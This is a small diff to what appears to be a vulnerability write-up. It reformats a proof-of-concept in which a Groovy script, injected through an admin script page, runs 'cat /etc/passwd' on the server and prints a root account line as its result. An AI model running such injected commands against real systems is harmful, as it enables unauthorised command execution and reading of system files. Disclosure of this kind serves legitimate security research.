@@ -11,13 +11,14 @@
 2) Navigate to **Development > Groovy > Add Script**  
 3) Inject Groovy Script:
 
-   ```groovy
-   def process = "cat /etc/passwd".execute()
+```groovy
+def process = "cat /etc/passwd".execute()
 def output = new StringBuffer()
 process.consumeProcessOutput(output, System.err)
 process.waitFor()
 
-println "${output}: "```
+println "${output}: "
+```
 Result : 
 ```
 root:x:0:0:root:/root:/bin/bash
